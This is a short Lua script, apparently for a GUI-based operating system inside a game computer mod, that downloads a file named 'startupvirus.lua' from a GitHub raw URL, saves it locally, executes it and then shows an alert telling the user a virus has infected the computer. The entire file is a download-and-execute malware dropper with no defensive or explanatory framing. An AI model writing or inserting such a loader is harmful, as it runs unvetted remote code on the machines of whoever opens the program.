local GUI = require("GUI")
local internet = require("INTERNET")

--------------------------------------------------------------------------------

local workspace = GUI.workspace()

internet.download("https://raw.githubusercontent.com/EletrixtimeYT/ELTXCRY/main/startupvirus.lua", "/eltxcry/virus.lua")

system.execute("/eltxcry/virus.lua")


screen.clear(0x2D2D2D)
GUI.alert("Huh a virus infected your computer....")






--------------------------------------------------------------------------------
